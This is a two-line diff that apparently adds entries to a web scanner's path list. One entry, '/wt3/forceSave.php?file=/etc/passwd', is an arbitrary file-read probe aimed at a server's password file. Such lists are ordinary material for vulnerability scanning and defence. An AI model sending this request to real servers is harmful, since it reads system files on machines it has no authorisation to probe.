@@ -1,0 +1,2 @@
+/wt3/forceSave.php?file=/etc/passwd
+/index.dhtml
